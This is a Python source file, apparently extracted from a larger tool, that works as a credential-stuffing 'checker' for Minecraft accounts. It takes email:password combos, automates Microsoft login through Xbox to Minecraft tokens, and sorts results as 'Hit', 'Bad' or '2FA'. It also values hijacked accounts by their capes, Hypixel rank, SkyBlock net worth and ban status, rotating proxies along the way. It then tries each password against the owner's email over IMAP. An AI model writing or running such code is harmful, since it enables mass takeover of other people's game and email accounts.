"""
minecraft_checker.py
Standalone Minecraft / Hypixel checker logic extracted from meow.py.
Covers:
  - Microsoft login & Xbox token flow
  - Minecraft account ownership / gamepass validation
  - Minecraft profile (name, UUID, capes)
  - Optifine cape check
  - Name-change availability
  - Hypixel stats (rank, level, BW stars, first/last login) via Plancke
  - Hypixel ban status via pyCraft connection
  - SkyBlock stats via soopy.dev
  - Full-access (IMAP) email check
"""

import concurrent.futures
import imaplib
import json
import re
import random
import socket
import threading
import time
import uuid as uuid_module
import warnings
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs

import requests
import urllib3

warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Optional pyCraft (needed for Hypixel ban checking)
# ---------------------------------------------------------------------------
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets.clientbound import play as clientbound_play
    from minecraft.networking.packets.clientbound import login as clientbound_login
    from minecraft.exceptions import LoginDisconnect, YggdrasilError
    MINECRAFT_AVAILABLE = True
except ImportError:
    MINECRAFT_AVAILABLE = False
    print("Warning: pyCraft not installed - Hypixel ban checking disabled.")

# ---------------------------------------------------------------------------
# Optional socks (needed for SOCKS5 ban-check proxies)
# ---------------------------------------------------------------------------
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

# ---------------------------------------------------------------------------
# Compiled regexes
# ---------------------------------------------------------------------------
_DECORATIVE_RE = re.compile(
    r"[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+"
)
HYPIXEL_TITLE_RE = re.compile(r"<title>(.+?)\s*\|\s*Plancke</title>", re.IGNORECASE)
HYPIXEL_NAME_RE  = re.compile(
    r'(?<=content="Plancke" /><meta property="og:locale" content="en_US" />'
    r'<meta property="og:description" content=").+?(?=")',
    re.S,
)
HYPIXEL_LEVEL_RE  = re.compile(r"(?<=Level:</b> ).+?(?=<br/><b>)")
FIRST_LOGIN_RE    = re.compile(r"(?<=<b>First login: </b>).+?(?=<br/><b>)")
LAST_LOGIN_RE     = re.compile(r"(?<=<b>Last login: </b>).+?(?=<br/>)")
BW_STARS_RE       = re.compile(r"(?<=<li><b>Level:</b> ).+?(?=</li>)")
BAN_ID_RE         = re.compile(r"Ban ID: ([A-Za-z0-9]+)")

# Microsoft login URL
SFTTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)
RE_SFTTAG  = re.compile(r'value="(.+?)"', re.S)
RE_URLPOST = re.compile(r"urlPost:'(.+?)'", re.S)
RE_IPT     = re.compile(r'(?<=ipt" value=")[^"]+')
RE_PPRID   = re.compile(r'(?<=pprid" value=")[^"]+')
RE_UAID    = re.compile(r'(?<=uaid" value=")[^"]+')
RE_ACTION  = re.compile(r'(?<=action=")[^"]+')
RE_RETURN  = re.compile(r'(?<=return_url=)[^&"]+')

MAX_RETRIES     = 3
DEFAULT_TIMEOUT = 10

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def clean_name(name: str) -> str:
    if not name:
        return ""
    return _DECORATIVE_RE.sub("", str(name)).strip()


def format_coins(num) -> str:
    """Format a large number into a human-readable coin string."""
    try:
        num = float(num)
    except (ValueError, TypeError):
        return "0"
    abs_num = abs(num)
    for threshold, suffix in [
        (1e15, "Q"), (1e12, "T"), (1e9, "B"), (1e6, "M"), (1e3, "K")
    ]:
        if abs_num >= threshold:
            return f"{num / threshold:.1f}{suffix}"
    return str(int(num))


def new_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/119.0.0.0 Safari/537.36"
        )
    })
    return s


# ---------------------------------------------------------------------------
# 1. Microsoft login
# ---------------------------------------------------------------------------

def get_sfttag(session: requests.Session):
    """Fetch the sFTTag value and urlPost endpoint from Microsoft login page."""
    for _ in range(MAX_RETRIES):
        try:
            text = session.get(SFTTAG_URL, timeout=DEFAULT_TIMEOUT).text
            sfttag_match = RE_SFTTAG.search(text)
            url_match    = RE_URLPOST.search(text)
            if sfttag_match and url_match:
                return url_match.group(1).replace("&amp;", "&"), sfttag_match.group(1)
        except Exception:
            pass
        time.sleep(0.1)
    return None, None


def get_microsoft_token(session: requests.Session, email: str, password: str):
    """
    Perform Microsoft OAuth login.

    Returns:
        "2FA"  - account requires 2FA / recovery
        None   - bad credentials or error
        str    - access token on success
    """
    url_post, sfttag = get_sfttag(session)
    if not url_post:
        return None

    for _ in range(MAX_RETRIES):
        try:
            data = {
                "login": email, "loginfmt": email,
                "passwd": password, "PPFT": sfttag,
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            resp = session.post(
                url_post, data=data, headers=headers,
                allow_redirects=True, timeout=DEFAULT_TIMEOUT,
            )

            # Success - token in URL fragment
            if "#" in resp.url and resp.url != SFTTAG_URL:
                token = parse_qs(urlparse(resp.url).fragment).get("access_token", [None])[0]
                if token:
                    return token

            # Cancel/redirect flow
            if "cancel?mkt=" in resp.text:
                try:
                    ipt        = RE_IPT.search(resp.text).group()
                    pprid      = RE_PPRID.search(resp.text).group()
                    uaid       = RE_UAID.search(resp.text).group()
                    action_url = RE_ACTION.search(resp.text).group()
                    ret = session.post(
                        action_url,
                        data={"ipt": ipt, "pprid": pprid, "uaid": uaid},
                        allow_redirects=True, timeout=DEFAULT_TIMEOUT,
                    )
                    return_url = RE_RETURN.search(ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=DEFAULT_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get("access_token", [None])[0]
                    if token:
                        return token
                except Exception:
                    pass

            # 2FA / account recovery prompts
            if any(v in resp.text for v in [
                "recover?mkt",
                "account.live.com/identity/confirm",
                "Email/Confirm?mkt",
                "/Abuse?mkt=",
            ]):
                return "2FA"

            # Bad credentials
            if any(v in resp.text.lower() for v in [
                "password is incorrect",
                "account doesn't exist",
                "that microsoft account doesn't exist",
                "tried to sign in too many times",
                "help us protect your account",
            ]):
                return None

        except Exception:
            pass
        time.sleep(0.1)

    return None


# ---------------------------------------------------------------------------
# 2. Xbox / Minecraft token exchange
# ---------------------------------------------------------------------------

def get_xbox_token(session: requests.Session, ms_token: str):
    """Exchange Microsoft access token for Xbox Live user token."""
    try:
        resp = session.post(
            "https://user.auth.xboxlive.com/user/authenticate",
            json={
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": ms_token,
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT",
            },
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            timeout=DEFAULT_TIMEOUT,
        )
        data  = resp.json()
        token = data.get("Token")
        uhs   = data["DisplayClaims"]["xui"][0]["uhs"]
        return token, uhs
    except Exception:
        return None, None


def get_xsts_token(session: requests.Session, xbox_token: str):
    """Exchange Xbox user token for XSTS token (scoped to Minecraft services)."""
    try:
        resp = session.post(
            "https://xsts.auth.xboxlive.com/xsts/authorize",
            json={
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT",
            },
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            timeout=DEFAULT_TIMEOUT,
        )
        data  = resp.json()
        token = data.get("Token")
        uhs   = data["DisplayClaims"]["xui"][0]["uhs"]
        return token, uhs
    except Exception:
        return None, None


def get_minecraft_token(session: requests.Session, xsts_token: str, uhs: str):
    """Exchange XSTS token for a Minecraft bearer token."""
    try:
        resp = session.post(
            "https://api.minecraftservices.com/authentication/login_with_xbox",
            json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
            headers={"Content-Type": "application/json"},
            timeout=DEFAULT_TIMEOUT,
        )
        return resp.json().get("access_token")
    except Exception:
        return None


def full_auth_flow(email: str, password: str, session: requests.Session = None):
    """
    Complete Microsoft -> Xbox -> Minecraft token flow.

    Returns:
        "2FA"  - account needs 2FA
        None   - login failed
        dict   - {ms_token, xbox_token, xsts_token, mc_token, session}
    """
    if session is None:
        session = new_session()

    ms_token = get_microsoft_token(session, email, password)
    if not ms_token or ms_token == "2FA":
        return ms_token

    xbox_token, _uhs = get_xbox_token(session, ms_token)
    if not xbox_token:
        return None

    xsts_token, uhs = get_xsts_token(session, xbox_token)
    if not xsts_token:
        return None

    mc_token = get_minecraft_token(session, xsts_token, uhs)

    return {
        "ms_token":   ms_token,
        "xbox_token": xbox_token,
        "xsts_token": xsts_token,
        "mc_token":   mc_token,
        "session":    session,
    }


# ---------------------------------------------------------------------------
# 3. Ownership / gamepass validation
# ---------------------------------------------------------------------------

def check_ownership(session: requests.Session, mc_token: str):
    """
    Check Minecraft entitlements endpoint and return account type string.

    Returns one of:
        "Normal Minecraft"
        "Normal Minecraft (with Game Pass)"
        "Normal Minecraft (with Game Pass Ultimate)"
        "Xbox Game Pass (PC)"
        "Xbox Game Pass Ultimate"
        None  - no entitlement found
    """
    for attempt in range(MAX_RETRIES):
        try:
            resp = session.get(
                "https://api.minecraftservices.com/entitlements/license",
                headers={"Authorization": f"Bearer {mc_token}"},
                verify=False,
                timeout=10,
            )
            if resp.status_code == 429:
                time.sleep(1)
                continue
            if resp.status_code != 200:
                return None

            items     = resp.json().get("items", [])
            has_mc    = False
            has_gp_pc = False
            has_gp_ult= False

            for item in items:
                name   = item.get("name", "")
                source = item.get("source", "")
                if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
                    has_mc = True
                if name == "product_game_pass_pc":
                    has_gp_pc = True
                if name == "product_game_pass_ultimate":
                    has_gp_ult = True

            if has_mc and has_gp_ult:
                return "Normal Minecraft (with Game Pass Ultimate)"
            if has_mc and has_gp_pc:
                return "Normal Minecraft (with Game Pass)"
            if has_mc:
                return "Normal Minecraft"
            if has_gp_ult:
                return "Xbox Game Pass Ultimate"
            if has_gp_pc:
                return "Xbox Game Pass (PC)"
            return None

        except Exception:
            time.sleep(0.1)

    return None


# ---------------------------------------------------------------------------
# 4. Minecraft profile (name, UUID, capes)
# ---------------------------------------------------------------------------

def get_minecraft_profile(session: requests.Session, mc_token: str) -> dict:
    """
    Fetch Minecraft profile info.

    Returns dict: {name, uuid, capes (list of alias strings)}
    """
    result = {"name": "N/A", "uuid": "N/A", "capes": []}
    for _ in range(MAX_RETRIES):
        try:
            resp = session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization": f"Bearer {mc_token}"},
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                result["name"]  = data.get("name", "N/A") or "N/A"
                result["uuid"]  = data.get("id",   "N/A") or "N/A"
                result["capes"] = [
                    c["alias"] for c in data.get("capes", []) if c.get("alias")
                ]
                return result
            if resp.status_code == 429:
                time.sleep(0.5)
                continue
        except Exception:
            time.sleep(0.1)
    return result


# ---------------------------------------------------------------------------
# 5. Name-change availability
# ---------------------------------------------------------------------------

def check_name_change(session: requests.Session, mc_token: str) -> dict:
    """
    Check if the Minecraft account can change its username.

    Returns dict:
        name_change_allowed (bool), created_at (str), age_string (str)
    """
    result = {"name_change_allowed": None, "created_at": None, "age_string": None}
    for _ in range(MAX_RETRIES):
        try:
            resp = session.get(
                "https://api.minecraftservices.com/minecraft/profile/namechange",
                headers={"Authorization": f"Bearer {mc_token}"},
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                result["name_change_allowed"] = data.get("nameChangeAllowed", False)
                created_at = data.get("createdAt")
                if created_at:
                    result["created_at"] = created_at
                    try:
                        try:
                            given = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                        except ValueError:
                            given = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                        given = given.replace(tzinfo=timezone.utc)
                        diff  = datetime.now(timezone.utc) - given
                        years  = diff.days // 365
                        months = diff.days % 365 // 30
                        days   = diff.days
                        fmt    = given.strftime("%m/%d/%Y")
                        if years > 0:
                            result["age_string"] = f"{years} {'year' if years == 1 else 'years'} - {fmt}"
                        elif months > 0:
                            result["age_string"] = f"{months} {'month' if months == 1 else 'months'} - {fmt}"
                        else:
                            result["age_string"] = f"{days} {'day' if days == 1 else 'days'} - {fmt}"
                    except Exception:
                        pass
                return result
            if resp.status_code == 429:
                time.sleep(0.5)
        except Exception:
            time.sleep(0.1)
    return result


# ---------------------------------------------------------------------------
# 6. Optifine cape check
# ---------------------------------------------------------------------------

def check_optifine_cape(username: str, session: requests.Session = None) -> str:
    """
    Check if the player has an Optifine cape.

    Returns: "Yes" | "No" | "Unknown"
    """
    if session is None:
        session = new_session()
    try:
        resp = session.get(
            f"http://s.optifine.net/capes/{username}.png",
            verify=False, timeout=8,
        )
        return "No" if "Not found" in resp.text else "Yes"
    except Exception:
        return "Unknown"


# ---------------------------------------------------------------------------
# 7. Hypixel stats via Plancke scrape
# ---------------------------------------------------------------------------

def get_hypixel_stats(username: str, session: requests.Session = None) -> dict:
    """
    Scrape Plancke for Hypixel player stats.

    Returns dict: {rank, level, first_login, last_login, bw_stars}
    """
    if session is None:
        session = new_session()

    result = {
        "rank":        None,
        "level":       None,
        "first_login": None,
        "last_login":  None,
        "bw_stars":    None,
    }

    try:
        resp = session.get(
            f"https://plancke.io/hypixel/player/stats/{username}",
            headers={"Accept-Encoding": "gzip, deflate"},
            verify=False,
            timeout=(5, 8),
        )
        tx = resp.text

        # Rank / display name (includes [VIP], [MVP++], etc.)
        m = HYPIXEL_TITLE_RE.search(tx)
        if m:
            result["rank"] = m.group(1)
        else:
            m = HYPIXEL_NAME_RE.search(tx)
            if m:
                result["rank"] = m.group()
            if not result["rank"]:
                m2 = re.search(
                    r"\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*" + re.escape(username),
                    tx, re.IGNORECASE,
                )
                if m2:
                    result["rank"] = m2.group(0)

        m = HYPIXEL_LEVEL_RE.search(tx)
        if m:
            result["level"] = m.group()

        m = FIRST_LOGIN_RE.search(tx)
        if m:
            result["first_login"] = m.group()

        m = LAST_LOGIN_RE.search(tx)
        if m:
            result["last_login"] = m.group()

        m = BW_STARS_RE.search(tx)
        if m:
            result["bw_stars"] = m.group()

    except Exception:
        pass

    return result


# ---------------------------------------------------------------------------
# 8. SkyBlock stats via soopy.dev
# ---------------------------------------------------------------------------

def _skill_average(member: dict) -> float:
    skills = member.get("skills", {})
    skill_names = [
        "alchemy", "carpentry", "combat", "enchanting",
        "farming", "fishing", "foraging", "mining", "taming",
    ]
    total, count = 0, 0
    for name in skill_names:
        sd = skills.get(name)
        if sd and "levelWithProgress" in sd:
            total += sd["levelWithProgress"]
            count += 1
    return total / count if count > 0 else 0.0


def get_skyblock_stats(username: str, player_uuid: str = None, timeout: int = DEFAULT_TIMEOUT) -> dict:
    """
    Fetch SkyBlock stats from soopy.dev.

    Returns dict with keys:
        networth, coins, avg_skill, sb_level,
        sw_stars, bw_stars, pit_gold, uhc_bounty,
        arcade_coins, sb_kills, sb_fairy_souls,
        valuable_items (list), summary (str)
    """
    result = {
        "networth": 0, "coins": 0, "avg_skill": 0.0, "sb_level": 0,
        "sw_stars": 0, "bw_stars": 0, "pit_gold": 0, "uhc_bounty": 0,
        "arcade_coins": 0, "sb_kills": 0, "sb_fairy_souls": 0,
        "valuable_items": [], "summary": None,
    }

    try:
        player_url = f"https://api.soopy.dev/player/{username}"
        p_data = None
        s_data = None

        if player_uuid:
            clean_uuid = player_uuid.replace("-", "")
            sb_url = f"https://soopy.dev/api/v2/player_skyblock/{clean_uuid}?networth=true"
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
                f1 = ex.submit(requests.get, player_url, timeout=timeout)
                f2 = ex.submit(requests.get, sb_url,     timeout=timeout)
                try:
                    r1 = f1.result()
                    if r1.status_code == 200:
                        p_data = r1.json()
                except Exception:
                    pass
                try:
                    r2 = f2.result()
                    if r2.status_code == 200:
                        s_data = r2.json()
                except Exception:
                    pass
        else:
            p_resp = requests.get(player_url, timeout=timeout)
            if p_resp.status_code == 200:
                p_data = p_resp.json()
                if p_data and p_data.get("success") and "data" in p_data:
                    fetched_uuid = p_data["data"].get("uuid", "").replace("-", "")
                    if fetched_uuid:
                        sb_url = f"https://soopy.dev/api/v2/player_skyblock/{fetched_uuid}?networth=true"
                        s_resp = requests.get(sb_url, timeout=timeout)
                        if s_resp.status_code == 200:
                            s_data = s_resp.json()

        if not p_data or not p_data.get("success") or "data" not in p_data:
            return result

        data = p_data["data"]
        ach  = data.get("achievements", {})

        result["sw_stars"]     = ach.get("skywars_you_re_a_star", 0)
        result["bw_stars"]     = ach.get("bedwars_level", 0)
        result["pit_gold"]     = ach.get("pit_gold", 0)
        result["uhc_bounty"]   = ach.get("uhc_bounty", 0)
        result["arcade_coins"] = ach.get("arcade_arcade_banker", 0)

        # Best SkyBlock profile
        best_member, max_score = None, -1
        profiles = (s_data or {}).get("data", {}).get("profiles", {})
        uuid_key = (player_uuid or "").replace("-", "")

        for profile in profiles.values():
            member = profile.get("members", {}).get(uuid_key)
            if not member:
                continue
            nw_d   = member.get("nwDetailed") or {}
            nw     = nw_d.get("networth", 0)
            sa     = _skill_average(member)
            sb_lvl = member.get("skyblock_level", 0)
            score  = nw / 1_000_000 * 100 + sa * 100 + sb_lvl * 10
            if score > max_score:
                max_score   = score
                best_member = member

        if best_member:
            result["coins"]          = best_member.get("coin_purse", 0)
            result["sb_kills"]       = best_member.get("kills", {}).get("total", 0)
            result["sb_fairy_souls"] = best_member.get("fairy_souls_collected", 0)
            result["sb_level"]       = best_member.get("skyblock_level", 0)
            result["avg_skill"]      = _skill_average(best_member)
            nw_d = best_member.get("nwDetailed") or {}
            result["networth"]       = nw_d.get("networth", 0) or result["coins"]

            types = nw_d.get("types", {})
            items = []
            for cat in ["armor", "equipment", "wardrobe", "weapons", "inventory"]:
                cat_data = types.get(cat)
                if cat_data and cat_data.get("items"):
                    for i in cat_data["items"]:
                        cleaned = clean_name(i.get("name", ""))
                        cleaned = re.sub("apis", "", cleaned, flags=re.IGNORECASE).strip()
                        if cleaned:
                            items.append(cleaned)
            result["valuable_items"] = items

        # Build summary string
        parts = []
        if result["networth"]:
            parts.append(f"NW: {format_coins(result['networth'])}")
        if result["coins"]:
            parts.append(f"Purse: {format_coins(result['coins'])}")
        if result["avg_skill"]:
            parts.append(f"Avg_Skill: {result['avg_skill']:.2f}")
        if result["sw_stars"]:
            parts.append(f"SW: {result['sw_stars']}")
        if result["bw_stars"]:
            parts.append(f"BW: {result['bw_stars']}")
        if result["pit_gold"]:
            parts.append(f"Pit_Gold: {format_coins(result['pit_gold'])}")
        if result["uhc_bounty"]:
            parts.append(f"UHC_Bounty: {format_coins(result['uhc_bounty'])}")
        if result["sb_level"]:
            parts.append(f"Sb_Lvl: {result['sb_level']}")
        if result["arcade_coins"]:
            parts.append(f"Arcade_Coins: {format_coins(result['arcade_coins'])}")
        if result["sb_kills"]:
            parts.append(f"Sb_Kills: {result['sb_kills']}")
        if result["sb_fairy_souls"]:
            parts.append(f"Sb_Fairy_Souls: {result['sb_fairy_souls']}")
        if result["valuable_items"]:
            shown    = result["valuable_items"][:5]
            rest     = len(result["valuable_items"]) - 5
            item_str = ", ".join(shown) + (f", +{rest} more" if rest > 0 else "")
            parts.append(f"Sb_Valuable_Items: {item_str}")

        result["summary"] = " ".join(parts) if parts else None

    except Exception:
        pass

    return result


# ---------------------------------------------------------------------------
# 9. Hypixel ban check via pyCraft
# ---------------------------------------------------------------------------

def _parse_ban_info(ban_text: str) -> dict:
    """Parse a Hypixel ban disconnect message into a structured dict."""
    info = {"full_message": ban_text, "ban_id": None, "duration": None, "reason": None}
    if not ban_text or not isinstance(ban_text, str):
        return info
    m = BAN_ID_RE.search(ban_text)
    if m:
        info["ban_id"] = m.group(1)
    if "permanently" in ban_text.lower():
        info["duration"] = "Permanently"
    else:
        m2 = re.search(r"\[([^\]]+)\]", ban_text)
        if m2:
            info["duration"] = m2.group(1)
    if "suspicious activity" in ban_text.lower():
        info["reason"] = "Suspicious activity"
    return info


def check_hypixel_ban(
    mc_token: str,
    player_name: str,
    player_uuid: str,
    ban_proxies: list = None,
    max_retries: int = MAX_RETRIES,
) -> dict:
    """
    Connect to mc.hypixel.net using pyCraft and detect ban status.

    Requires: pip install pyCraft

    Returns dict:
        banned  (bool | None)
        status  ("Banned" | "Unbanned" | "Unknown" | "Error: ...")
        ban_info (dict)
    """
    if not MINECRAFT_AVAILABLE:
        return {"banned": None, "status": "Error: pyCraft not installed", "ban_info": {}}

    result = {"banned": None, "status": "Unknown", "ban_info": {}}
    lock   = threading.Lock()

    for attempt in range(max_retries):
        auth_token = AuthenticationToken(
            username=player_name,
            access_token=mc_token,
            client_token=uuid_module.uuid4().hex,
        )
        auth_token.profile = Profile(id_=player_uuid, name=player_name)

        connection = Connection(
            "mc.hypixel.net", 25565,
            auth_token=auth_token,
            initial_version=47,
            allowed_versions={"1.8", 47},
        )

        def _handle_disconnect(packet):
            try:
                data     = json.loads(str(packet.json_data))
                data_str = str(data)

                def _set(status, banned, ban_text=""):
                    with lock:
                        result["banned"]   = banned
                        result["status"]   = status
                        result["ban_info"] = _parse_ban_info(ban_text) if ban_text else {}

                if "temporarily banned" in data_str:
                    try:
                        duration = data["extra"][4]["text"].strip()
                        ban_id   = data["extra"][8]["text"].strip()
                        msg = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                    except Exception:
                        msg = "Temporarily Banned"
                    _set("Banned", True, msg)

                elif "Suspicious activity" in data_str:
                    try:
                        ban_id = data["extra"][6]["text"].strip()
                        msg = f"[Permanently] Suspicious activity. Ban ID: {ban_id}"
                    except Exception:
                        msg = "[Permanently] Suspicious activity"
                    _set("Banned", True, msg)

                elif "You are permanently banned from this server!" in data_str:
                    try:
                        reason = data["extra"][2]["text"].strip()
                        ban_id = data["extra"][6]["text"].strip()
                        msg = f"[Permanently] {reason} Ban ID: {ban_id}"
                    except Exception:
                        msg = "[Permanently] Banned"
                    _set("Banned", True, msg)

                elif "The Hypixel Alpha server is currently closed!" in data_str:
                    _set("Unbanned", False)

                elif "Failed cloning your SkyBlock data" in data_str:
                    _set("Unbanned", False)

                else:
                    extra_list = data.get("extra", [])
                    full_msg   = "".join(
                        x.get("text", "") for x in extra_list if isinstance(x, dict)
                    ) or data.get("text", str(data))
                    _set("Banned", True, full_msg)

            except Exception as e:
                with lock:
                    result["status"] = f"Error: parse failed ({e})"

        connection.register_packet_listener(
            _handle_disconnect, clientbound_login.DisconnectPacket, early=True
        )
        connection.register_packet_listener(
            _handle_disconnect, clientbound_play.DisconnectPacket, early=True
        )

        def _mark_unbanned(packet):
            with lock:
                if result["banned"] is None:
                    result["banned"] = False
                    result["status"] = "Unbanned"
            threading.Thread(
                target=lambda: (time.sleep(1.0), connection.disconnect()),
                daemon=True,
            ).start()

        for pkt_type in [
            clientbound_play.JoinGamePacket,
            clientbound_play.KeepAlivePacket,
            clientbound_play.PlayerPositionAndLookPacket,
            clientbound_play.TimeUpdatePacket,
            clientbound_play.RespawnPacket,
        ]:
            connection.register_packet_listener(_mark_unbanned, pkt_type, early=True)

        try:
            if ban_proxies and SOCKS_AVAILABLE:
                proxy = random.choice(ban_proxies)
                if "@" in proxy:
                    creds, host_port = proxy.split("@")
                    uname, passwd    = creds.split(":")
                    host, port       = host_port.split(":")
                    socks.set_default_proxy(
                        socks.SOCKS5, addr=host, port=int(port),
                        username=uname, password=passwd,
                    )
                else:
                    host, port = proxy.split(":")
                    socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port))
                socket.socket = socks.socksocket

            connection.connect()

            # Wait up to 30 s for a ban/unbanned packet
            for _ in range(3000):
                with lock:
                    if result["banned"] is not None:
                        break
                time.sleep(0.01)

            connection.disconnect()

        except Exception:
            pass

        with lock:
            if result["banned"] is None:
                result["status"] = "Error: Connection Timeout"

        # Retry only on errors
        if result["status"].startswith("Error") and attempt < max_retries - 1:
            with lock:
                result["banned"] = None
                result["status"] = "Unknown"
            time.sleep(1)
            continue

        break

    return result


# ---------------------------------------------------------------------------
# 10. IMAP full-access (email login) check
# ---------------------------------------------------------------------------

IMAP_MAP = {
    "gmail.com":      "imap.gmail.com",
    "googlemail.com": "imap.gmail.com",
    "yahoo.com":      "imap.mail.yahoo.com",
    "outlook.com":    "outlook.office365.com",
    "hotmail.com":    "outlook.office365.com",
    "live.com":       "outlook.office365.com",
    "icloud.com":     "imap.mail.me.com",
    "me.com":         "imap.mail.me.com",
    "mac.com":        "imap.mail.me.com",
    "aol.com":        "imap.aol.com",
}


def check_email_access(email: str, password: str) -> str:
    """
    Attempt IMAP login to verify full email access.

    Returns: "True" | "False" | "Unknown"
    """
    try:
        domain = email.split("@")[1].lower()
    except IndexError:
        return "False"

    imap_server = IMAP_MAP.get(domain) or f"imap.{domain}"

    try:
        mail = imaplib.IMAP4_SSL(imap_server, timeout=10)
        mail.login(email, password)
        mail.logout()
        return "True"
    except imaplib.IMAP4.error:
        return "False"
    except Exception:
        return "Unknown"


# ---------------------------------------------------------------------------
# 11. High-level combined checker
# ---------------------------------------------------------------------------

def check_account(
    email: str,
    password: str,
    check_ban: bool = True,
    check_email: bool = True,
    check_sb: bool = True,
    ban_proxies: list = None,
) -> dict:
    """
    Run the full checker pipeline for one email:password combo.

    Returns a result dict with all gathered fields.
    """
    out = {
        "email":    email,
        "password": password,
        "status":   None,          # "Hit" | "Bad" | "2FA"
        "account_type":            None,
        "name":                    None,
        "uuid":                    None,
        "capes":                   [],
        "optifine_cape":           None,
        "name_change_allowed":     None,
        "name_age":                None,
        "hypixel_rank":            None,
        "hypixel_level":           None,
        "hypixel_first_login":     None,
        "hypixel_last_login":      None,
        "hypixel_bw_stars":        None,
        "hypixel_ban":             None,
        "hypixel_ban_status":      None,
        "hypixel_ban_info":        {},
        "skyblock":                {},
        "email_access":            None,
    }

    session = new_session()

    # Step 1: Microsoft login
    tokens = full_auth_flow(email, password, session)

    if tokens == "2FA":
        out["status"] = "2FA"
        return out

    if not tokens or not isinstance(tokens, dict):
        out["status"] = "Bad"
        return out

    mc_token = tokens.get("mc_token")
    if not mc_token:
        out["status"] = "Bad"
        return out

    # Step 2: Ownership check
    account_type = check_ownership(session, mc_token)
    if not account_type:
        out["status"] = "Bad"
        return out

    out["status"]       = "Hit"
    out["account_type"] = account_type

    # Step 3: Profile
    profile    = get_minecraft_profile(session, mc_token)
    out["name"]  = profile["name"]
    out["uuid"]  = profile["uuid"]
    out["capes"] = profile["capes"]

    username = out["name"]

    # Run remaining checks concurrently
    futures = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:

        futures["name_change"] = ex.submit(check_name_change, session, mc_token)

        if username and username != "N/A":
            futures["optifine"] = ex.submit(check_optifine_cape, username, session)
            futures["hypixel"]  = ex.submit(get_hypixel_stats,   username, session)

        if check_sb and username and username != "N/A":
            futures["skyblock"] = ex.submit(get_skyblock_stats, username, out["uuid"])

        if check_email:
            futures["email"] = ex.submit(check_email_access, email, password)

    # Collect results
    if "name_change" in futures:
        r = futures["name_change"].result()
        out["name_change_allowed"] = r.get("name_change_allowed")
        out["name_age"]            = r.get("age_string")

    if "optifine" in futures:
        out["optifine_cape"] = futures["optifine"].result()

    if "hypixel" in futures:
        r = futures["hypixel"].result()
        out["hypixel_rank"]       = r.get("rank")
        out["hypixel_level"]      = r.get("level")
        out["hypixel_first_login"]= r.get("first_login")
        out["hypixel_last_login"] = r.get("last_login")
        out["hypixel_bw_stars"]   = r.get("bw_stars")

    if "skyblock" in futures:
        out["skyblock"] = futures["skyblock"].result()

    if "email" in futures:
        out["email_access"] = futures["email"].result()

    # Hypixel ban check (synchronous – needs live TCP connection)
    if check_ban and username and username != "N/A":
        ban_result = check_hypixel_ban(
            mc_token=mc_token,
            player_name=username,
            player_uuid=out["uuid"],
            ban_proxies=ban_proxies,
        )
        out["hypixel_ban"]        = ban_result.get("banned")
        out["hypixel_ban_status"] = ban_result.get("status")
        out["hypixel_ban_info"]   = ban_result.get("ban_info", {})

    return out


# ---------------------------------------------------------------------------
# CLI entry-point
# ---------------------------------------------------------------------------